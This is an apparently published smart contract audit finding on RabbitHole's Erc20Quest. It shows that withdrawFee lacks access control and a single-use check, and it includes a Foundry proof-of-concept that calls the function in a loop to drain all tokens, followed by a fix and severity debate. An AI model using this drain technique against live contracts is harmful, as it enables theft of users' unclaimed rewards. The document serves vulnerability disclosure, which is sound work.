[H-02] Protocol fees can be withdrawn multiple times inErc20Quest
Submitted byadriro, also found bytimongty,trustindistrust,M4TZ1P,Garrett,holme,CodingNameKiki,hansfriese,fs0c,tnevler,lukris02,fs0c,fs0c,horsefacts,cryptonue,bytes032,sashik_eth,cccz,manikantanynala97,wait,rbserver,yixxas,Iurii3,hl_,zadaru13,MiniGlome,glcanvas,glcanvas,doublesharp,bin2chen,Lotus,KIntern_NA,SovaSlava,KmanOfficial,martin,peanuts,peakbolt,0xmrhoodie,gzeon,IllIllI,Bauer,0xngndev,0xngndev,mrpathfindr,mahdikarimi,evan,0xRobocop,zaskoh,omis,ArmedGoose,ElKu,Atarpara,codeislight,chaduke,trustindistrust,AkshaySrivastav,carrotsmuggler,hihen,prestoncodes,ladboy233,mert_eren,usmannk,Ruhum,HollaDieWaldfee, andrvierdiiev
ThewithdrawFeefunction present in theErc20Questcontract can be used to withdraw protocol fees after a quest has ended, which are sent to the protocol fee recipient address:
https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L102-L104
functionwithdrawFee()publiconlyAdminWithdrawAfterEnd{IERC20(rewardToken).safeTransfer(protocolFeeRecipient,protocolFee());}
This function doesn’t provide any kind of protection and can be called multiple times, which will send more tokens than intended to the protocol fee recipient, stealing funds from the contract.
Impact
ThewithdrawFeefunction can be called multiples after a quest has ended, potentially stealing funds from other people. The contract may have funds from unclaimed receipts (i.e. users that have completed the quest, redeemed their receipt but haven’t claimed their rewards yet) and remaining tokens from participants who didn’t complete the quest, which can be claimed back by the owner of the quest.
Note also that theonlyAdminWithdrawAfterEndmodifier, even though it indicates that an “admin” should be allowed to call this function, only validates the quest end time and fails to provide any kind of access control:
https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L76-L79
modifieronlyAdminWithdrawAfterEnd() {if(block.timestamp<endTime)revertNoWithdrawDuringClaim();_;}
This means that anyone could call this function, so even if the quest owner or the protocol fee recipient behave correctly, a griefer could potentially call this function right after the quest end time to remove all (or most) of the funds from the contract.
Proof of Concept
In the following demonstration, thewithdrawFeefunction is called multiple times by a bad actor to remove all tokens from the quest contract.
contractAuditTestisTest{addressdeployer;uint256signerPrivateKey;addresssigner;addressroyaltyRecipient;addressminter;addressprotocolFeeRecipient;QuestFactoryfactory;ReceiptRendererreceiptRenderer;RabbitHoleReceiptreceipt;TicketRendererticketRenderer;RabbitHoleTicketstickets;ERC20token;functionsetUp()public{deployer=makeAddr("deployer");signerPrivateKey=0x123;signer=vm.addr(signerPrivateKey);vm.label(signer,"signer");royaltyRecipient=makeAddr("royaltyRecipient");minter=makeAddr("minter");protocolFeeRecipient=makeAddr("protocolFeeRecipient");vm.startPrank(deployer);// ReceiptreceiptRenderer=newReceiptRenderer();RabbitHoleReceiptreceiptImpl=newRabbitHoleReceipt();receipt=RabbitHoleReceipt(address(newERC1967Proxy(address(receiptImpl),"")));receipt.initialize(address(receiptRenderer),royaltyRecipient,minter,0);// factoryQuestFactoryfactoryImpl=newQuestFactory();factory=QuestFactory(address(newERC1967Proxy(address(factoryImpl),"")));factory.initialize(signer,address(receipt),protocolFeeRecipient);receipt.setMinterAddress(address(factory));// ticketsticketRenderer=newTicketRenderer();RabbitHoleTicketsticketsImpl=newRabbitHoleTickets();tickets=RabbitHoleTickets(address(newERC1967Proxy(address(ticketsImpl),"")));tickets.initialize(address(ticketRenderer),royaltyRecipient,minter,0);// ERC20 tokentoken=newERC20("Mock ERC20","MERC20");factory.setRewardAllowlistAddress(address(token),true);vm.stopPrank();}functionsignReceipt(addressaccount,stringmemoryquestId)internalviewreturns(bytes32hash,bytesmemorysignature){hash=keccak256(abi.encodePacked(account,questId));bytes32message=ECDSA.toEthSignedMessageHash(hash);(uint8v,bytes32r,bytes32s) =vm.sign(signerPrivateKey,message);signature=abi.encodePacked(r,s,v);}functionclaimReceipt(addressaccount,stringmemoryquestId)internal{(bytes32hash,bytesmemorysignature) =signReceipt(account,questId);vm.prank(account);factory.mintReceipt(questId,hash,signature);}functiontest_Erc20Quest_ProtocolFeeWithdrawMultipleTimes()public{addressalice=makeAddr("alice");addressattacker=makeAddr("attacker");uint256startTime=block.timestamp+1hours;uint256endTime=startTime+1hours;uint256totalParticipants=1;uint256rewardAmountOrTokenId=1ether;stringmemoryquestId="a quest";// create, fund and start questvm.startPrank(deployer);Erc20Questquest=Erc20Quest(factory.createQuest(address(token),endTime,startTime,totalParticipants,rewardAmountOrTokenId,"erc20",questId));uint256rewards=totalParticipants*rewardAmountOrTokenId;uint256fees= (rewards*factory.questFee()) /10_000;deal(address(token),address(quest),rewards+fees);quest.start();vm.stopPrank();// simulate at least one user claims a receiptclaimReceipt(alice,questId);// simulate time elapses until the end of the questvm.warp(endTime);// The following can be executed by attacker (griefer) or by the fee recipientvm.startPrank(attacker);uint256protocolFee=quest.protocolFee();uint256withdrawCalls= (rewards+fees) /protocolFee;for(uint256i=0;i<withdrawCalls;i++) {quest.withdrawFee();}// Fee recipient has 100% of the fundsassertEq(token.balanceOf(protocolFeeRecipient),rewards+fees);assertEq(token.balanceOf(address(quest)),0);vm.stopPrank();}}
Recommendation
Add a flag to the contract to indicate if protocol fees have been already withdrawn. Add a check to prevent the function from being called again.
waynehoover (RabbitHole) disagreed with severity and commented:
I agree that this is an issue, but not a high risk issue. I expect high risk issues to be issues that can be called by anyone, not owners.As owners there are plenty of ways we can sabotage our contracts (for example via the set* functions) it is up to the owner to be sure they are executing the function correctly and in the correct context.The owner understands how this function works, so they can be sure not to call it multiple times.
gzeon (warden) commented:
While I agree that this is an issue, but not a high risk issue. I expect high risk issues to be issues that can be called by anyone, not owners.As owners there are plenty of ways we can sabotage our contracts (for example via the set* functions) it is up to the owner to be sure they are executing the function correctly and in the correct context.The owner understands how this function works, so they can be sure not to call it multiple times.onlyAdminWithdrawAfterEndis notonlyAdmin, anyone can callwithdrawFeeafter end.
kirk-baird (judge) commented:
I agree with @gzeon. This issue is a combination of two sub issues:Anyone can callwithdrawFee()withdrawFee()can be called multiple timesAllowing it to be called by anyone is sufficient to rate it high severity.